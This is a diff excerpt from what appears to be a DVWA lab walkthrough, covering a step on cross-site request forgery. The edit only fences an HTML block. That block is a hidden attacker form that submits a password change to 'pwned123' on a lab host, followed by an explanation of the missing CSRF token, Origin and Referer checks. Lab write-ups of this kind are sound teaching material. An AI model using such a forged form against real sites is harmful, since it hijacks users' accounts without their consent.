@@ -172,13 +172,13 @@ RFI is one of the most dangerous vulnerabilities because attackers can execute a
 ## Step 9 — CSRF (Cross-Site Request Forgery)
 
 Built malicious attacker site:
-
+```text
 <form action="http://192.168.56.103/dvwa/vulnerabilities/csrf/" method="GET">
   <input type="hidden" name="password_new" value="pwned123">
   <input type="hidden" name="password_conf" value="pwned123">
   <input type="hidden" name="Change" value="Change">
 </form>
-
+```
 Explanation:  
 DVWA’s password-change function does not verify that the request came from DVWA itself. There is no CSRF token, no Origin checking, and no Referer validation.
 
